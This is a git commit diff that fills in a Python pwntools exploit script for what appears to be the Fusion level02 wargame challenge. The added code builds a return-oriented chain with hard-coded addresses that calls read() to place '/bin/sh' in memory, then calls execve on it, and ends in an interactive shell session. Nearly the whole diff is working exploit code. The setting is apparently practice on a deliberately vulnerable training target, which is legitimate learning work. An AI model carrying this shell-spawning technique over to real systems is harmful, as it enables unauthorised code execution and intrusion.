e9578c7a6ed6aa8cc003fbd942f3f89c6d4833ed
root <root@localhost.localdomain>
2019-03-22 20:06:29 +0000

    New challenge

--- fusion/level02 (DONE)/script.py
+++ fusion/level02 (DONE)/script.py
@@ -3,11 +3,36 @@ from pwn import *
 import struct
 import re
 
+cmd = "/bin/sh" + "\x00"
 
 # Make the payload
 def makePayload(payload):
 
-	# TODO
+	memory = 0x804b360
+	binSH = memory + 1
+
+	read = 0x8048860
+	execve = 0x80489b0
+
+	pppr = 0x08049529 # 0x804952c
+
+	# Write to memory the /bin/sh string
+	# read(0, memory, len(cmd))
+	payload += p32(read)
+	payload += p32(pppr)
+	payload += p32(0)
+	payload += p32(memory)
+	payload += p32(len(cmd))
+
+	# Call execve with the /bin/sh
+	# execve(binSH, 0x00000000, 0x00000000)
+	payload += p32(execve)
+	payload += "AAAA"
+	payload += p32(binSH)
+	payload += "\x00"*4
+	payload += "\x00"*4
+
+	return payload
 
 
 # Sending the data
@@ -50,4 +75,7 @@ s.recvuntil("]")
 s.recv(4) # Getting the size
 s.recv(4096) # Getting the encrypted file
 s.sendline("Q") # Ending the script
-s.recvall() # Ending the script
+
+s.sendline(cmd)
+
+s.interactive()
